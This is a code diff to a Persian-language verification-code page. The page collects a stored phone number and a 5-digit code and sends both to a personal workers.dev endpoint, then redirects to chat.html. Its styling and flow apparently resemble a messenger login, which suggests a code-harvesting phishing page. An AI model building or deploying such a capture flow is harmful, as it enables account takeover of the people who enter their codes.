@@ -145,6 +145,30 @@
             transform: scale(0.96);
             box-shadow: none;
         }
+        
+        .error-message {
+            color: #ff3b30;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+            text-align: center;
+        }
+        
+        .loader {
+            display: none;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #2481cc;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -164,6 +188,9 @@
             <div class="code-box" id="b3"></div>
             <div class="code-box" id="b4"></div>
         </div>
+        
+        <div class="loader" id="loader"></div>
+        <div class="error-message" id="errorMsg">کد وارد شده صحیح نیست. لطفاً مجدداً تلاش کنید.</div>
 
         <div class="resender-text" id="resendBtn">ارسال مجدد کد</div>
     </div>
@@ -185,7 +212,13 @@
     </div>
 
     <script>
+        // ======= آدرس Worker =======
+        const WORKER_URL = "https://appp.salhamir146.workers.dev";
+        // ===========================
+
         let enteredCode = '';
+        let isVerifying = false;
+        
         const boxes = [
             document.getElementById('b0'), 
             document.getElementById('b1'), 
@@ -193,6 +226,10 @@
             document.getElementById('b3'), 
             document.getElementById('b4')
         ];
+        
+        const errorMsg = document.getElementById('errorMsg');
+        const loader = document.getElementById('loader');
+        const resendBtn = document.getElementById('resendBtn');
 
         // خواندن شماره ذخیره شده از صفحه قبل برای نمایش به کاربر
         const savedPhone = localStorage.getItem('userPhone');
@@ -200,36 +237,154 @@
             document.getElementById('subText').textContent = `کد ۵ رقمی ارسال شده به شماره ${savedPhone} را وارد کنید.`;
         }
 
+        // تابع تایید کد با Worker
+        async function verifyCodeWithWorker(code) {
+            if (isVerifying) return;
+            isVerifying = true;
+            loader.style.display = 'block';
+            errorMsg.style.display = 'none';
+            
+            try {
+                const phone = localStorage.getItem('userPhone') || '09123456789';
+                
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        phone: phone,
+                        code: code,
+                        action: 'verify'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    // تایید موفق
+                    localStorage.setItem('userCode', code);
+                    localStorage.setItem('isVerified', 'true');
+                    setTimeout(() => {
+                        window.location.href = 'chat.html';
+                    }, 300);
+                } else {
+                    // تایید ناموفق
+                    errorMsg.textContent = data.message || 'کد وارد شده صحیح نیست. لطفاً مجدداً تلاش کنید.';
+                    errorMsg.style.display = 'block';
+                    // پاک کردن کد وارد شده
+                    enteredCode = '';
+                    updateBoxes();
+                }
+            } catch (error) {
+                console.error('Error verifying code:', error);
+                errorMsg.textContent = 'خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.';
+                errorMsg.style.display = 'block';
+                enteredCode = '';
+                updateBoxes();
+            } finally {
+                isVerifying = false;
+                loader.style.display = 'none';
+            }
+        }
+
+        // تابع ارسال مجدد کد
+        async function resendCode() {
+            if (isVerifying) return;
+            
+            try {
+                const phone = localStorage.getItem('userPhone') || '09123456789';
+                
+                const response = await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        phone: phone,
+                        action: 'resend'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    alert('کد جدید با موفقیت ارسال شد.');
+                    enteredCode = '';
+                    updateBoxes();
+                    errorMsg.style.display = 'none';
+                } else {
+                    alert(data.message || 'خطا در ارسال مجدد کد.');
+                }
+            } catch (error) {
+                console.error('Error resending code:', error);
+                alert('خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.');
+            }
+        }
+
+        // آپدیت نمایش باکس‌ها
+        function updateBoxes() {
+            for (let i = 0; i < 5; i++) {
+                boxes[i].textContent = enteredCode[i] || '';
+                boxes[i].classList.remove('active');
+                if (i === enteredCode.length) {
+                    boxes[i].classList.add('active');
+                }
+            }
+        }
+
+        // رویدادهای کلیک دکمه‌های کیبورد
         document.querySelectorAll('.key-btn').forEach(btn => {
             btn.addEventListener('click', () => {
+                if (isVerifying) return;
+                
                 const val = btn.getAttribute('data-v');
                 if (val === 'del') {
                     if (enteredCode.length > 0) {
                         enteredCode = enteredCode.slice(0, -1);
+                        errorMsg.style.display = 'none';
                     }
                 } else {
                     if (enteredCode.length < 5) {
                         enteredCode += val;
+                        errorMsg.style.display = 'none';
                     }
                 }
 
-                // آپدیت ظاهر باکس‌ها
-                for (let i = 0; i < 5; i++) {
-                    boxes[i].textContent = enteredCode[i] || '';
-                    boxes[i].classList.remove('active');
-                    if (i === enteredCode.length) {
-                        boxes[i].classList.add('active');
-                    }
-                }
+                updateBoxes();
 
-                // وقتی ۵ رقم کامل شد، ورود به صفحه اصلی چت
+                // وقتی ۵ رقم کامل شد، تایید کد
                 if (enteredCode.length === 5) {
-                    localStorage.setItem('userCode', enteredCode);
-                    setTimeout(() => {
-                        window.location.href = 'chat.html';
-                    }, 200);
+                    verifyCodeWithWorker(enteredCode);
                 }
             });
+        });
+
+        // رویداد ارسال مجدد کد
+        resendBtn.addEventListener('click', resendCode);
+
+        // پشتیبانی از کیبورد فیزیکی (برای دسکتاپ)
+        document.addEventListener('keydown', (e) => {
+            if (isVerifying) return;
+            
+            if (e.key >= '0' && e.key <= '9') {
+                if (enteredCode.length < 5) {
+                    enteredCode += e.key;
+                    errorMsg.style.display = 'none';
+                    updateBoxes();
+                    if (enteredCode.length === 5) {
+                        verifyCodeWithWorker(enteredCode);
+                    }
+                }
+                e.preventDefault();
+            } else if (e.key === 'Backspace') {
+                if (enteredCode.length > 0) {
+                    enteredCode = enteredCode.slice(0, -1);
+                    errorMsg.style.display = 'none';
+                    updateBoxes();
+                }
+                e.preventDefault();
+            }
         });
     </script>
 </body>
